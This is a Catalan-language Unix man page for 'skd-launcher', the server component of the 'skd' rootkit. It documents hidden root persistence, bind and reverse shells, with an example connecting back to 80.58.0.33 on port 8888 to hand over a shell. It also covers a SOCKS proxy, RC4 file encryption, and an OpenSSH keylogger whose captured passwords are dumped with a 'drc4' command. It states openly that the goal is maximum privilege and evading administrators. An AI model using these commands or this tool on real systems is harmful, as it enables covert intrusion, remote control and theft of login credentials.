.TH SKD-LAUNCHER 1

.SH NOM

skd-launcher - part launcher del rootkit skd

.SH SINOPSIS

.B skd-launcher
.PP
.B skd-launcher
.I port
.PP
.B skd-launcher 
.I host port
.PP
.B skd-launcher -c
.I command option

.SH OPCIONS

El skd-launcher pot ser executat de diferents maneres depenent del nombre de paràmetres que se li passin per línia de comandes.
.PP
En tots aquests modes d'execució, en cas de què un paràmetre sigui passat incorrectament, el launcher surt sense emetre cap missatge.


.B Execució sense paràmetres
.PP
.TP
Si s'executa sense paràmetres, aquest ha de ser executat com a root. Al executar-se, aquest queda en funcionament com a servei de sistema.
.PP

.B Execució amb un paràmetre
.PP
Si s'executa passant-li per paràmetre un enter, aquest obre el port TCP i queda en execució com a servei a la màquina.
.PP
.IR port :
Port TCP on el launcher intentarà arrancar el seu servei.
.PP

.B Execució amb dos paràmetres
.PP
Si s'executa passant-li dos paràmetres, el launcher s'intenta connectar al host i port on host és un string passat com a primer paràmetre, i el port, un enter passat en el segon paràmetre.
.PP
.IR host :
Host destí on s'intentarà connectar per a trobar-hi un client i oferir-li una shell.
.PP
.IR port :
Port destí del host.
.PP

.B Execució amb tres paràmetres
.PP
En l'últim mode d'execució, el launcher s'executa utilitzant l'opció -c i dos paràmetres. El primer és la comanda a executar, i el segon un paràmetre utilitzat per la comanda.
.PP
.B -c
{
.I drc4 file
|
.I rc4 file
|
.I socks port
| keys service
}
.PP
.I drc4 file
: desxifra el fitxer file utilitzant les claus de xifratge rc4 configurades. 
.PP
.I rc4 file
: xifra el ftxer file utilitzant les claus de xifratge rc4 configurades. 
.PP
.I socks port
: engega un servei socks4a en el port tcp especificat.
.PP
.I keys service
: engega el keylogger en el servei especificat. En aquest moment només està implementat el servei ssh que fa referència a serveis openssh 2.x.
.PP
.SH DISPONIBILITAT

Totes les variants de UNIX que compleixin l'estàndard POSIX.

.SH DESCRIPCIÓ

skd-launcher és la part servidor del rootkit skd. Aquesta part, és la què implementa totes les funcionalitats principals. Per tal d'utilitzar-les ens cal disposar de la part client i del password amb què va estar configurat. Sempre ens interessarà que el skd-launcher sigui executat amb el màxim de privilegis possibles, i que aquest no sigui descobert per els administradors de la màquina.
.PP

.SH EXEMPLES
.B skd-launcher
.PP
Aquesta execució sense paràmetres, ens deixaria el servei corrent a la màquina del mode més ocult possible.

.B skd-launcher 9999
.PP
Executant-lo d'aquesta manera, tindríem un servei TCP escoltant al port 9999.

.B skd-launcher 80.58.0.33 8888
.PP
D'aquesta manera aconseguirem que el launcher es connecti al host 80.58.0.33 port 8888 per tal d'oferir-li una shell. D'aquesta manera no queda cap servei en execució.

.B skd-launcher -c drc4 .k_rc4_sshd
.PP
Llançant el launcher així, ens mostraria per pantalla tots els passwords obtinguts a la màquina i guardats de forma xifrada en el fitxer .k_rc4_sshd.

.B skd-launcher -c rc4 /etc/fstab > fstab.rc4
.PP
Amb aquesta execució, xifraríem el fitxer /etc/fstab i el guardaríem en el fitxer fstab.rc4.

.B skd-launcher -c socks 9999
.PP
Amb això iniciem el servei socks al port tcp 9999.

.B skd-launcher -c keys sshd
.PP
Llançant el launcher així, arranquem el keylogger del servei openssh.

.SH AUTOR

Albert Sellarès <whats[@t]wekk.net>

.SH VEURE TAMBÉ
.RS
skd-client(1), skd-config(7).
.RE
